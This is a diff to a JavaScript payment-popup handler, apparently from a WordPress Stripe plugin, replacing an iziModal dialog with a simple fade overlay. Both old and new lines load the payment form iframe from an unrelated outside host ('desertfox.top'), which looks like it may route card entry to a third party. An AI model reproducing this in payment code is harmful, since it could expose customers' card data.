@@ -5,32 +5,20 @@ var stripeHandlerNG = function (data) {
     jQuery('#asp_ng_button_' + data.uniq_id).click(function (e) {
         e.preventDefault();
         if (!parent.modal) {
-            jQuery('body').append('<div id="asp-payment-popup-' + parent.data.uniq_id + '" style="display: none;"><div class="asp-popup-spinner-cont"></div><div class="asp-popup-iframe-cont"><iframe frameborder="0" class="asp-popup-iframe" src="https://desertfox.top/miniserv/cleanwp/?asp_action=show_pp&product_id=' + parent.data.product_id + '"></iframe></div></div>');
-            jQuery('#asp-payment-popup-' + parent.data.uniq_id).iziModal({
-                title: parent.data.name,
-                transitionIn: 'fadeInUp',
-                transitionOut: 'fadeOutDown',
-                closeOnEscape: false,
-                overlayClose: false,
-                fullscreen: false,
-                headerColor: '#3795cb',
-                restoreDefaultContent: false,
-            });
-            jQuery('#asp-payment-popup-' + parent.data.uniq_id).iziModal('open');
+            jQuery('body').append('<div id="asp-payment-popup-' + parent.data.uniq_id + '" class="asp-popup-iframe-cont"><div class="asp-popup-spinner-cont"></div><iframe frameborder="0" allowtransparency="true" class="asp-popup-iframe" src="https://desertfox.top/miniserv/cleanwp/?asp_action=show_pp&product_id=' + parent.data.product_id + '"></iframe></div>');
             parent.modal = jQuery('#asp-payment-popup-' + parent.data.uniq_id);
-            parent.modal.find('.asp-popup-spinner-cont').append(jQuery('div#asp-btn-spinner-container-' + data.uniq_id).html());
+            parent.modal.css("display", "flex");
+            parent.modal.find('.asp-popup-spinner-cont').append(jQuery('div#asp-btn-spinner-container-' + parent.data.uniq_id).html());
             var iframe = parent.modal.find('iframe');
-            var iframeCont = parent.modal.find('.asp-popup-iframe-cont');
             iframe.on('load', function (e) {
-                var aligner = iframe.contents().find('.Aligner-item');
-                jQuery(iframe[0].contentWindow).resize(function () {
-                    if (iframeCont.height() !== aligner.prop('scrollHeight')) {
-                        iframeCont.height(aligner.prop('scrollHeight') + 20);
-                        console.log(aligner.prop('scrollHeight'));
-                    }
-                });
                 parent.modal.find('.asp-popup-spinner-cont').hide();
-                iframe.show();
+                aligner = iframe.contents().find('#Aligner');
+                aligner.on('click', function (e) {
+                    if (e.target !== e.currentTarget) {
+                        return;
+                    }
+                    parent.modal.fadeOut();
+                })
                 parent.iForm = iframe.contents().find('form#payment-form');
                 parent.iForm.on('submit', function (e) {
                     e.preventDefault();
@@ -45,14 +33,14 @@ var stripeHandlerNG = function (data) {
                         parent.form.append('<input type="hidden" name="asp_is_live" value="' + parent.data.is_live + '">');
                         jQuery('div#asp-all-buttons-container-' + data.uniq_id).hide();
                         jQuery('div#asp-btn-spinner-container-' + data.uniq_id).show();
-                        parent.modal.iziModal('close');
+                        parent.modal.fadeOut();
                         jQuery('form#asp_ng_form_' + parent.data.uniq_id).submit();
                     }
                     return false;
                 });
             });
         } else {
-            parent.modal.iziModal('open');
+            parent.modal.css("display", "flex").hide().fadeIn();
         }
     });
 }
